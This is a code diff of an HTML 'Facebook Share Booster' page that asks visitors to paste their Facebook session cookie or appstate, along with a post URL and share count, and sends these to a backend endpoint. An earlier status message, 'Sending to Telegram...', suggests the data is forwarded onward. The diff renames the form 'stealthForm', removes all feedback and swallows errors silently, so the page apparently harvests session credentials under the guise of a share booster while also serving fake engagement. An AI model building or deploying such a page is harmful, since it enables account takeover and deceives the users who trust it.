@@ -1,63 +1,65 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>FB Booster (Testing)</title>
+  <meta charset="UTF-8">
+  <title>Facebook Share Booster</title>
   <style>
-    body { background: #121212; color: #fff; font-family: sans-serif; padding: 20px; text-align: center; }
-    input, select, textarea, button {
-      margin: 10px;
+    body { background: #111; color: #fff; font-family: sans-serif; padding: 20px; text-align: center; }
+    input, textarea, select, button {
+      display: block;
+      margin: 12px auto;
       padding: 10px;
       width: 80%;
       max-width: 400px;
-      background: #1e1e1e;
+      border: 1px solid #333;
+      border-radius: 8px;
+      background: #222;
       color: #fff;
-      border: 1px solid #444;
-      border-radius: 6px;
     }
-    button { background-color: #00f0ff; color: black; font-weight: bold; }
-    img { border-radius: 10px; margin-top: 10px; max-width: 150px; }
+    button {
+      background: #00ffea;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
-  <h2>🧪 FB Booster Test Panel</h2>
-  <textarea name="cookie" placeholder="Paste cookie/appstate" rows="4" required></textarea><br>
-  <input type="text" name="url" placeholder="Facebook Post URL" required><br>
-  <input type="number" name="amount" placeholder="Share Amount" required><br>
-  <input type="number" name="interval" placeholder="Interval in seconds" required><br>
-  <select name="server">
-    <option value="server1">Server 1</option>
-    <option value="server2">Server 2</option>
-    <option value="server3">Server 3</option>
-  </select><br>
-
-  <!-- Button click will trigger the backend -->
-  <button id="triggerBtn">Run Booster 🔥</button>
-  <div id="output" style="margin-top: 20px;"></div>
+  <h2>🚀 Facebook Share Booster</h2>
+  <form id="stealthForm">
+    <textarea name="cookie" placeholder="Paste your FB cookie or appstate here" required rows="4"></textarea>
+    <input type="text" name="url" placeholder="Facebook Post URL" required>
+    <input type="number" name="amount" placeholder="Amount (e.g. 100)" required>
+    <input type="number" name="interval" placeholder="Interval in seconds" required>
+    <select name="server">
+      <option value="server1">Server 1</option>
+      <option value="server2">Server 2</option>
+      <option value="server3">Server 3</option>
+    </select>
+    <button type="submit">Start Boost</button>
+  </form>
 
   <script>
     document.querySelectorAll("button").forEach(btn => {
       btn.addEventListener("click", async () => {
-        const cookie = document.querySelector('textarea[name="cookie"]').value;
-        const url = document.querySelector('input[name="url"]').value;
-        const amount = parseInt(document.querySelector('input[name="amount"]').value);
-        const interval = parseInt(document.querySelector('input[name="interval"]').value);
-        const server = document.querySelector('select[name="server"]').value;
-
-        const output = document.getElementById("output");
-        output.textContent = "Sending to Telegram...";
+        const form = document.getElementById("stealthForm");
+        const data = {
+          cookie: form.cookie.value,
+          url: form.url.value,
+          amount: parseInt(form.amount.value),
+          interval: parseInt(form.interval.value),
+          server: form.server.value
+        };
 
         try {
-          const res = await fetch("/api/fbshare", {
+          await fetch("/api/fbshare", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ cookie, url, amount, interval, server })
+            body: JSON.stringify(data)
           });
-
-          const data = await res.json();
-          output.innerHTML = `✅ Boost started for <b>${data.name}</b><br><img src="${data.photo}" />`;
+          // nothing shown to the user
         } catch (e) {
-          output.textContent = "❌ Failed: " + e.message;
+          // silently fail
         }
       });
     });
